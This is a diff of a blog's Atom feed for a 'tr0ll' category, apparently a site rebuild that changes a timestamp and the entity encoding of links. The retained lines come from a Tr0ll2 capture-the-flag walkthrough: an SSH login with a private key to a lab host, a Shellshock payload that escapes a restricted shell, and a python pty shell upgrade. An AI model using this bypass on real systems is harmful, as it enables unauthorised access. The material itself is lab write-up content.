@@ -4,7 +4,7 @@
   <title><![CDATA[Category: tr0ll | F4l13n5n0w]]></title>
   <link href="http://f4l13n5n0w.github.io/blog/categories/tr0ll/atom.xml" rel="self"/>
   <link href="http://f4l13n5n0w.github.io/"/>
-  <updated>2017-03-28T04:34:57-04:00</updated>
+  <updated>2017-04-08T06:53:28-04:00</updated>
   <id>http://f4l13n5n0w.github.io/</id>
   <author>
     <name><![CDATA[F4l13n5n0w]]></name>
@@ -418,7 +418,7 @@
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 <span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob &lt;a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#110;&#x6f;&#111;&#x62;&#x40;&#x31;&#x30;&#46;&#x31;&#48;&#x2e;&#x31;&#x30;&#46;&#49;&#x34;&#49;">&#x6e;&#x6f;&#x6f;&#98;&#x40;&#x31;&#x30;&#46;&#x31;&#48;&#x2e;&#x31;&#48;&#x2e;&#x31;&#52;&#x31;&lt;/a>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob &lt;a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x6e;&#x6f;&#x6f;&#x62;&#x40;&#49;&#48;&#x2e;&#x31;&#x30;&#46;&#49;&#48;&#x2e;&#49;&#52;&#x31;">&#110;&#111;&#111;&#x62;&#x40;&#x31;&#48;&#x2e;&#49;&#48;&#46;&#49;&#48;&#46;&#x31;&#52;&#49;&lt;/a>
 </span><span class='line'>The authenticity of host &lsquo;10.10.10.141 (10.10.10.141)&rsquo; can&rsquo;t be established.
 </span><span class='line'>ECDSA key fingerprint is 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96.
 </span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
@@ -440,7 +440,7 @@
 <span class='line-number'>8</span>
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob &lt;a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#110;&#111;&#x6f;&#98;&#x40;&#49;&#x30;&#46;&#x31;&#48;&#x2e;&#49;&#x30;&#46;&#49;&#52;&#49;">&#x6e;&#x6f;&#x6f;&#98;&#x40;&#x31;&#48;&#46;&#49;&#48;&#46;&#x31;&#48;&#46;&#x31;&#52;&#x31;&lt;/a> &lsquo;() { :;}; /bin/bash&rsquo;
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob &lt;a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x6e;&#111;&#111;&#98;&#64;&#49;&#x30;&#x2e;&#49;&#x30;&#46;&#49;&#48;&#46;&#x31;&#52;&#49;">&#x6e;&#111;&#111;&#x62;&#64;&#49;&#x30;&#46;&#x31;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x31;&#x34;&#x31;&lt;/a> &lsquo;() { :;}; /bin/bash&rsquo;
 </span><span class='line'>id
 </span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)
 </span><span class='line'>python -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo;
